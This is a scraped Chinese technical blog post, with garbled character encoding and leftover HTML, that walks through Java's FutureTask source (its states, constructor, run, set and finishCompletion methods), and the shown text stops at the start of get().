            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/501817459614766/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¢¨å®ˆåŸè§„
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T09:42:09.000Z" title="Mon Dec 15 2025 09:42:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€Futreä»‹ç»</h2>
<p>ä¸»è¦ç‰¹ç‚¹ï¼š</p>
<p>1ã€å¯ä»¥æ‹¿åˆ°å­çº¿ç¨‹çš„è¿”å›å€¼</p>
<p>2ã€å¦‚æœä¸»çº¿ç¨‹è¦æ‹¿å­çº¿ç¨‹çš„è¿”å›å€¼ï¼Œä¸»çº¿ç¨‹ä¼šé˜»å¡ä½</p>
<p>åˆ›å»ºçº¿ç¨‹çš„æ–¹å¼ä¸€èˆ¬å¸¸ç”¨çš„æ˜¯ Threadã€Runnable çš„æ–¹å¼ï¼Œå¦‚æœéœ€è¦å½“å‰å¤„ç†çš„ä»»åŠ¡æœ‰è¿”å›å€¼çš„è¯ï¼Œéœ€è¦ä½¿ç”¨ Callableï¼ŒCallableéœ€è¦é…åˆ Futureä½¿ç”¨ã€‚</p>
<p>Futureæ˜¯ä¸€ä¸ªæ¥å£ï¼Œä¸€èˆ¬ä¼šä½¿ç”¨ FutureTaskå®ç°ç±»å»æ¥æ”¶ Callableä»»åŠ¡çš„è¿”å›ç»“æœã€‚</p>
<p>FutureTaskå­˜åœ¨ä¸€äº›é—®é¢˜ï¼ŒåŒæ­¥éé˜»å¡æ‰§è¡Œçš„ä»»åŠ¡ï¼Œä»–ä¸ä¼šä¸»åŠ¨é€šçŸ¥ä½ è¿”å›ç»“æœæ˜¯ä»€ä¹ˆï¼Ÿ</p>
<h2 data-id="heading-1">äºŒã€FutureTaskçš„ä½¿ç”¨</h2>
<p>ç®€å•çš„ä½¿ç”¨æ–¹å¼</p>
<ul>
<li>Callable æ˜¯ä½ è¦æ‰§è¡Œçš„ä»»åŠ¡</li>
<li>FutureTask æ˜¯å­˜æ”¾ä»»åŠ¡è¿”å›çš„ç»“æœ --&gt; åŒæ­¥é˜»å¡å¼çš„</li>
</ul>

<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(<span class="hljs-params">String[] args</span>) throws Exception</span> {
    futrueTask();
}

<span class="hljs-comment">// æµ‹è¯•FutureTaskçš„ä½¿ç”¨</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">futrueTask</span>() throws Exception</span> {
    <span class="hljs-comment">// é‡Œé¢çš„lambdaè¡¨è¾¾å¼ æ˜¯ Callabeçš„å®ç°</span>
    FutureTask&lt;Integer&gt; futureTask = <span class="hljs-keyword">new</span> FutureTask&lt;&gt;(() -&gt; {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"æˆ‘æ˜¯FutureTaskï¼Œæˆ‘å…ˆæ‰§è¡Œï¼ï¼"</span>);
        Thread.sleep(<span class="hljs-number">2000</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">110</span>;
    });

    Thread thread = <span class="hljs-keyword">new</span> Thread(futureTask);
    System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"æˆ‘æ˜¯ä¸»çº¿ç¨‹ï¼ï¼ï¼"</span>);
    thread.start();
    System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"é˜»å¡ä½ï¼Œç­‰å­ä»»åŠ¡è·‘å®Œï¼Œæ‰ä¼šæ‹¿åˆ°è¿”å›ç»“æœ ï¼š "</span> + futureTask.<span class="hljs-keyword">get</span>());
}
</code></pre>

<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">callableTask</span>() throws Exception</span> {
    <span class="hljs-comment">// æµ‹è¯•ä½¿ç”¨ Collable</span>
    Callable&lt;Integer&gt; callable = () -&gt; {
        Thread.sleep(<span class="hljs-number">2000</span>);
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"æˆ‘æ˜¯ Callableï¼Œé˜»å¡äº† 2ç§’"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-number">121</span>;
    };
    FutureTask&lt;Integer&gt; futureTask = <span class="hljs-keyword">new</span> FutureTask(callable);
    Thread thread = <span class="hljs-keyword">new</span> Thread(futureTask);
    System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"æµ‹è¯• Callableï¼ï¼ï¼ï¼"</span>);
    thread.start();
    System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"callableé˜»å¡åçš„ç»“æœæ˜¯ï¼š"</span> + futureTask.<span class="hljs-keyword">get</span>());
}
</code></pre>
<p>è¿™å—å£°æ˜ä¸€ç‚¹ï¼š</p>
<p><strong>1ã€ä¸ºä»€ä¹ˆ new Threadçš„æ—¶å€™ï¼Œå‚æ•°å¯ä»¥ä¼ FutureTaskç±»å‹ï¼Ÿ</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7ff965cb5e34d7ead1ffc839381cd91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5a6I5Z-O6KeE:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766396528&amp;x-signature=BeL8gDRrx6YNYvQkzCnOLGJHK4g%3D" alt="" loading="lazy"/></p>
<p>FutureTaskå®ç°äº†RunnableFutureæ¥å£ï¼ŒRunnableFutureæ¥å£ç»§æ‰¿äº†Runnableæ¥å£ï¼Œæ‰€ä»¥FutureTaskå¯ä»¥è¯´æ˜¯ Runnableæ¥å£çš„å®ç°ç±»</p>
<p><strong>2ã€æŸ¥çœ‹ FutureTaskçš„æ„é€ å™¨</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/718889b2558d4b379df826cda30ee034~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5a6I5Z-O6KeE:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766396528&amp;x-signature=nj4UHuPA1Ew0PW%2Fqg%2F4jt9P4msE%3D" alt="" loading="lazy"/></p>
<p>å‚æ•°å¯ä»¥ä¼  Callableçš„å®ç°ç±»ï¼Œä¹Ÿå¯ä»¥ä¼  Runnableçš„å®ç°ç±» + ç»“æœ --&gt; Runnableçš„å®ç°ç±»ä¸éœ€è¦æŒ‡å®šè¿”å›ç»“æœï¼Œæ‰€ä»¥éœ€è¦æŒ‡å®šè¿”å›ç»“æœã€‚</p>
<h2 data-id="heading-2">ä¸‰ã€FutureTaskæºç åˆ†æ</h2>
<p>FutureTaskçš„åŠŸèƒ½åªåˆ†æå¦‚ä¸‹å‡ ä¸ªæ–¹æ³•ï¼š</p>
<p>1ã€æ„é€ å™¨ç›¸å…³æ–¹æ³•</p>
<p>2ã€run() --&gt; çº¿ç¨‹å¯åŠ¨æ—¶ï¼Œè°ƒç”¨çš„æ–¹æ³•</p>
<p>3ã€get() --&gt; ä¸»çº¿ç¨‹é˜»å¡è·å–è¿”å›ç»“æœ</p>
<p>ä½™ä¸‹çš„æ–¹æ³•ï¼Œæ ¹æ®è¿™å‡ ä¸ªæ–¹æ³•å¾€ä¸‹å»¶ä¼¸åˆ†æã€‚</p>
<h3 data-id="heading-3">1ã€å±æ€§åˆ†æ</h3>
<pre><code class="hljs language-arduino" lang="arduino">    <span class="hljs-comment">/**
     *
     * çŠ¶æ€æµè½¬è¿‡ç¨‹
     * NEW -&gt; COMPLETING -&gt; NORMAL
     * NEW -&gt; COMPLETING -&gt; EXCEPTIONAL
     * NEW -&gt; CANCELLED
     * NEW -&gt; INTERRUPTING -&gt; INTERRUPTED
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> state; <span class="hljs-comment">// è¡¨ç¤ºå­çº¿ç¨‹çš„è¿è¡ŒçŠ¶æ€ï¼ŒåŒ…å«å¦‚ä¸‹ä¸ƒä¸ªçŠ¶æ€</span>
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> NEW          = <span class="hljs-number">0</span>; <span class="hljs-comment">// åˆå§‹çŠ¶æ€ï¼Œæ„é€ å™¨newçš„æ—¶å€™åˆå§‹åŒ–ä¸º0</span>

    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> COMPLETING   = <span class="hljs-number">1</span>; <span class="hljs-comment">// ä»»åŠ¡æ‰§è¡Œå®Œï¼Œç”Ÿæˆè¿”å›ç»“æœï¼Œå°è£…ç»™ FutureTask</span>

    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> NORMAL       = <span class="hljs-number">2</span>; <span class="hljs-comment">// æ•´ä¸ªå­çº¿ç¨‹è¿è¡Œç»“æŸï¼ŒFutureTaskå°è£…ç»“æŸ</span>

    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> EXCEPTIONAL  = <span class="hljs-number">3</span>; <span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡æ—¶ï¼Œå‘ç”Ÿå¼‚å¸¸</span>

    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> CANCELLED    = <span class="hljs-number">4</span>; <span class="hljs-comment">// ä»»åŠ¡è¢«å–æ¶ˆ</span>

    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> INTERRUPTING = <span class="hljs-number">5</span>; <span class="hljs-comment">// çº¿ç¨‹çš„ä¸­æ–­çŠ¶æ€è¢«è®¾ç½®ä¸ºtrueï¼ˆç°åœ¨è¿˜åœ¨è¿è¡Œï¼‰</span>

    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> INTERRUPTED  = <span class="hljs-number">6</span>; <span class="hljs-comment">// çº¿ç¨‹çŠ¶æ€ä¸ºä¸­æ–­</span>

    <span class="hljs-comment">/** ä»»åŠ¡å°è£…ä¸º Callableï¼Œå…·ä½“è¿˜å¾—äº¤ç»™ Callableæ¥è¿è¡Œ */</span>
    <span class="hljs-keyword">private</span> Callable&lt;V&gt; callable;
    <span class="hljs-comment">/** è¿”å›ç»“æœï¼ŒFutureTask.get() æ‹¿åˆ°çš„è¿”å›ç»“æœ */</span>
    <span class="hljs-keyword">private</span> Object outcome; 
    <span class="hljs-comment">/** å…·ä½“æ‰§è¡Œçš„çº¿ç¨‹ */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> Thread runner;
    <span class="hljs-comment">/** å¦‚æœæœ‰å…¶ä»–çº¿ç¨‹è°ƒç”¨get()æ–¹æ³•ï¼Œéœ€è¦æŒ‚èµ·ç­‰å¾…ï¼Œè¿™ä¸ªå•é¡¹é“¾è¡¨ç”¨æ¥å­˜æ”¾éœ€è¦æŒ‚èµ·ç­‰å¾…çš„çº¿ç¨‹ */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> WaitNode waiters;
</code></pre>
<h3 data-id="heading-4">2ã€æ„é€ å™¨åˆ†æ</h3>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// è¿™é‡Œç®€å•åˆ†æå‚æ•°ä¼ é€’ Callable çš„å®ç°ç±»çš„æƒ…å†µ</span>
<span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">FutureTask</span>(Callable&lt;V&gt; <span class="hljs-keyword">callable</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">callable</span> == <span class="hljs-literal">null</span>){
         <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>();   
    }
    this.<span class="hljs-keyword">callable</span> = <span class="hljs-keyword">callable</span>; <span class="hljs-comment">// èµ‹å€¼ç»™æˆå‘˜å˜é‡å‚æ•° Callable</span>
    this.state = NEW;       <span class="hljs-comment">// åˆå§‹åŒ– FutureTaskçš„çŠ¶æ€ä¸º New</span>
}
</code></pre>
<h3 data-id="heading-5">3ã€run()æ–¹æ³•</h3>
<p>Thread.start() --&gt; å¯åŠ¨çº¿ç¨‹ä¹‹åï¼Œä¼šè°ƒç”¨åˆ°run()æ–¹æ³• --&gt; Callableçš„ callæ–¹æ³•ï¼Œæ˜¯é€šè¿‡runæ–¹æ³•æ¥æ‰§è¡Œçš„callæ–¹æ³•</p>
<pre><code class="hljs language-csharp" lang="csharp"> <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span>()</span> {
        <span class="hljs-comment">// æ£€æŸ¥ä»»åŠ¡çŠ¶æ€æ˜¯å¦å·²ç»ä¸æ˜¯NEWï¼ˆåˆå§‹çŠ¶æ€ï¼‰</span>
        <span class="hljs-comment">// æˆ–è€… CASæ“ä½œï¼šå°è¯•å°†runnerå­—æ®µä»nullè®¾ç½®ä¸ºå½“å‰çº¿ç¨‹ ï¼Œå¦‚æœæ“ä½œå¤±è´¥ï¼Œreturn</span>
        <span class="hljs-keyword">if</span> (state != NEW || !RUNNER.compareAndSet(<span class="hljs-keyword">this</span>, <span class="hljs-literal">null</span>, Thread.currentThread())){
            <span class="hljs-keyword">return</span>;
        }
        <span class="hljs-comment">// å‡†å¤‡æ‰§è¡Œä»»åŠ¡</span>
        <span class="hljs-keyword">try</span> {
            Callable&lt;V&gt; c = callable;
            <span class="hljs-comment">// ä»»åŠ¡ä¸ä¸º null  å¹¶ä¸” çŠ¶æ€ä¸ºåˆå§‹åŒ–çŠ¶æ€</span>
            <span class="hljs-keyword">if</span> (c != <span class="hljs-literal">null</span> &amp;&amp; state == NEW) {
                <span class="hljs-comment">// æ”¾è¿”å›ç»“æœ</span>
                V result;
                <span class="hljs-comment">// ä»»åŠ¡æ‰§è¡Œæ˜¯å¦ä¸ºæ­£å¸¸ç»“æŸ</span>
                boolean ran;
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-comment">// è¿è¡Œcallæ–¹æ³•ï¼Œæ‹¿åˆ°è¿”å›ç»“æœå°è£…åˆ°resultä¸­</span>
                    result = c.call();
                    <span class="hljs-comment">// ä»»åŠ¡æ­£å¸¸ç»“æŸ</span>
                    ran = <span class="hljs-literal">true</span>;
                } <span class="hljs-keyword">catch</span> (Throwable ex) { <span class="hljs-comment">// å‡ºç°å¼‚å¸¸</span>
                    result = <span class="hljs-literal">null</span>; <span class="hljs-comment">// ç»“æœä¸º null</span>
                    ran = <span class="hljs-literal">false</span>; <span class="hljs-comment">// å¼‚å¸¸è¿”å›ï¼Œranè®¾ç½®ä¸ºfalse</span>
                    setException(ex); <span class="hljs-comment">// è®¾ç½®å¼‚å¸¸ä¿¡æ¯</span>
                }
                <span class="hljs-keyword">if</span> (ran){
                    <span class="hljs-comment">// æ­£å¸¸è¿”å›ç»“æŸï¼Œå°è£…è¿”å›ç»“æœ</span>
                    <span class="hljs-keyword">set</span>(result);
                } 
            }
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-comment">// å°†å…·ä½“æ‰§è¡Œçš„çº¿ç¨‹ç½®ä¸º null</span>
            runner = <span class="hljs-literal">null</span>;
            <span class="hljs-comment">// æ‹¿åˆ°çŠ¶æ€</span>
            <span class="hljs-built_in">int</span> s = state;
            <span class="hljs-comment">// ä¸­æ–­åšä¸€äº›åç»­å¤„ç†</span>
            <span class="hljs-keyword">if</span> (s &gt;= INTERRUPTING){
                handlePossibleCancellationInterrupt(s);
            }
        }
    }
</code></pre>
<p>ä¸­æ–­å¤„ç†æµç¨‹</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// ä¸­æ–­å¤„ç†æµç¨‹</span>
<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">handlePossibleCancellationInterrupt</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> s</span>)</span> {
    <span class="hljs-comment">// </span>
    <span class="hljs-keyword">if</span> (s == INTERRUPTING)
        <span class="hljs-comment">// ç»ˆæ€æ˜¯INTERRUPTED ï¼Œè¿™é‡Œåˆ¤æ–­å¦‚æœæ˜¯ä¸­æ–­è®¾ç½®ä¸º trueï¼Œåˆ™è®©å‡º CPU çš„æ—¶é—´ç‰‡</span>
        <span class="hljs-keyword">while</span> (state == INTERRUPTING){
             Thread.<span class="hljs-keyword">yield</span>(); <span class="hljs-comment">// wait out pending interrupt</span>
        }
    <span class="hljs-comment">// assert state == INTERRUPTED;</span>
}
</code></pre>
<p>è¿™é‡Œç”¨è‡ªæ—‹ç­‰å¾…ï¼Œä¸éœ€è¦sleepçš„åŸå› ï¼š</p>
<ul>
<li>ä» INTERRUPTING åˆ° INTERRUPTED é€Ÿåº¦æå¿«ï¼Œå‡ çº³ç§’å³å¯ï¼Œç”¨yieldè®©å‡º CPU æ—¶é—´ç‰‡ï¼Œä¸éœ€è¦sleepçš„ä¸Šä¸‹æ–‡çº¿ç¨‹åˆ‡æ¢çš„å¼€é”€</li>
</ul>

<pre><code class="hljs language-vbnet" lang="vbnet">æ—¶é—´çº¿:
<span class="hljs-symbol">t0:</span> çŠ¶æ€=<span class="hljs-built_in">NEW</span>, ä»»åŠ¡è¿è¡Œä¸­
<span class="hljs-symbol">t1:</span> çº¿ç¨‹Aè°ƒç”¨cancel(<span class="hljs-literal">true</span>)
    çŠ¶æ€å˜ä¸ºINTERRUPTING
    å‘è¿è¡Œçº¿ç¨‹å‘é€ä¸­æ–­ä¿¡å·
<span class="hljs-symbol">t2:</span> çº¿ç¨‹Bè°ƒç”¨<span class="hljs-keyword">get</span>()ï¼Œçœ‹åˆ°çŠ¶æ€æ˜¯INTERRUPTING
    è¿›å…¥handlePossibleCancellationInterrupt
    å¼€å§‹<span class="hljs-keyword">while</span>å¾ªç¯
<span class="hljs-symbol">t3:</span> çº¿ç¨‹Aå®Œæˆä¸­æ–­ï¼ŒçŠ¶æ€å˜ä¸ºINTERRUPTED
<span class="hljs-symbol">t4:</span> çº¿ç¨‹Bé€€å‡ºå¾ªç¯ï¼Œç»§ç»­æ‰§è¡Œ
</code></pre>
<p>setæ–¹æ³•</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">protected</span> void <span class="hljs-keyword">set</span>(V v) {
    <span class="hljs-comment">// é€šè¿‡ CAS è®¾ç½®çº¿ç¨‹çŠ¶æ€ä¸ºcompleting</span>
    <span class="hljs-keyword">if</span> (STATE.compareAndSet(<span class="hljs-keyword">this</span>, NEW, COMPLETING)) {
        <span class="hljs-comment">// ç»“æœèµ‹å€¼ç»™ outcome</span>
        outcome = v;
        <span class="hljs-comment">// è®¾ç½®çŠ¶æ€ä¸ºç»ˆæ€ NORMAL</span>
        STATE.setRelease(<span class="hljs-keyword">this</span>, NORMAL); <span class="hljs-comment">// final state</span>
        <span class="hljs-comment">// æœ€ç»ˆå¤„ç† --&gt; å”¤é†’waiterså•å‘é“¾è¡¨é‡Œçš„é˜»å¡çº¿ç¨‹</span>
        finishCompletion();
    }
}
</code></pre>
<p>è®¾ç½®çŠ¶æ€ä¸º Normalç»ˆæ€ --&gt; èµ‹å€¼ç»“æœç»™æˆå‘˜å±æ€§ outcome --&gt; å”¤é†’waitersé‡Œçš„é˜»å¡çº¿ç¨‹</p>
<h3 data-id="heading-6">4ã€finishCompletion()æ–¹æ³•</h3>
<p>ä»»åŠ¡çŠ¶æ€å·²ç»å˜ä¸ºäº†NORMALï¼Œåšä¸€äº›åç»­å¤„ç†</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä»waiterså•å‘é“¾è¡¨é‡Œå–å€¼ä¾æ¬¡å”¤é†’çº¿ç¨‹</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">finishCompletion</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// assert state &gt; COMPLETING;</span>
    <span class="hljs-comment">// å¾ªç¯éå†å–waitersé‡Œçš„èŠ‚ç‚¹</span>
    <span class="hljs-keyword">for</span> (WaitNode q; (q = waiters) != <span class="hljs-literal">null</span>;) {
        <span class="hljs-keyword">if</span> (WAITERS.weakCompareAndSet(<span class="hljs-built_in">this</span>, q, <span class="hljs-literal">null</span>)) { <span class="hljs-comment">// å°†æˆå‘˜å±æ€§waitersé‡Œçš„å€¼ç½®ä¸ºnull</span>
            <span class="hljs-keyword">for</span> (;;) { <span class="hljs-comment">// æ­»å¾ªç¯ä»é“¾è¡¨é‡Œå–å€¼</span>
                <span class="hljs-comment">// å–å‡ºèŠ‚ç‚¹é‡Œçš„çº¿ç¨‹å€¼</span>
                <span class="hljs-type">Thread</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> q.thread;
                <span class="hljs-keyword">if</span> (t != <span class="hljs-literal">null</span>) {
                    <span class="hljs-comment">// ç§»é™¤æ‰çº¿ç¨‹å€¼</span>
                    q.thread = <span class="hljs-literal">null</span>;
                    <span class="hljs-comment">// å”¤é†’çº¿ç¨‹</span>
                    LockSupport.unpark(t);
                }
                <span class="hljs-comment">// å¾€åæ‰¾ï¼Œæ¥ç€å”¤é†’ï¼Œè®°å½•nextèŠ‚ç‚¹</span>
                <span class="hljs-type">WaitNode</span> <span class="hljs-variable">next</span> <span class="hljs-operator">=</span> q.next;
                <span class="hljs-keyword">if</span> (next == <span class="hljs-literal">null</span>){ <span class="hljs-comment">// å¦‚æœæ²¡æœ‰nextèŠ‚ç‚¹ï¼Œç›´æ¥breakï¼Œè¯´æ˜é˜Ÿåˆ—é‡Œæ²¡æœ‰é˜»å¡çš„çº¿ç¨‹äº†</span>
                    <span class="hljs-keyword">break</span>;
                }
                <span class="hljs-comment">// åˆ é™¤qèŠ‚ç‚¹</span>
                q.next = <span class="hljs-literal">null</span>; <span class="hljs-comment">// unlink to help gc</span>
                <span class="hljs-comment">// qæ¥åˆ°next</span>
                q = next;
            }
            <span class="hljs-keyword">break</span>;
        }
    }
    <span class="hljs-comment">// æ‹“å±•æ–¹æ³•ï¼Œæ²¡æœ‰ä»»ä½•å®ç°ï¼Œå¯è‡ªå·±å®ç°</span>
    done();
    <span class="hljs-comment">// æˆå‘˜å±æ€§ Callable è®¾ç½®ä¸ºnullï¼Œä»»åŠ¡å¤„ç†å®Œæˆäº†ï¼Œå¯ä»¥æ‹œæ‹œäº†</span>
    callable = <span class="hljs-literal">null</span>;        <span class="hljs-comment">// to reduce footprint</span>
}
</code></pre>
<p>æ ¸å¿ƒæµç¨‹ï¼šå”¤é†’é˜»å¡çº¿ç¨‹ + æˆå‘˜å±æ€§ callableç½®ä¸ºnull</p>
<h3 data-id="heading-7">5ã€get()æ–¹æ³•</h3>
<p>å…¶ä»–çº¿ç¨‹è°ƒç”¨get()æ–¹æ³•ï¼Œé˜»å¡æ¥è·å– FutureTaskçš„ç»“æœ</p>
<p>get()æ–¹æ³•æœ‰ä¸¤ä¸ªï¼šä¸€ä¸ªå¸¦æ—¶é—´ï¼Œä¸€ä¸ªä¸å¸¦æ—¶é—´</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c092112260b4fe28c3ded8a7f4e089c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5a6I5Z-O6KeE:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766396528&amp;x-signature=DzNGHBGF%2BLb13hGzoXhWfvaOCmw%3D" alt="" loading="lazy"/></p>
<p>æœ€ç»ˆéƒ½ä¼šè°ƒç”¨åˆ°awaitDone()è¿™ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬å°±ä»ç®€å•çš„getæ–¹æ³•æ¥è¿›è¡Œåˆ†æ</p>
<pre><code class="hljs language-scss" lang="scss">public V <span class="hljs-built_in">get</span>() throws InterruptedException, ExecutionException {
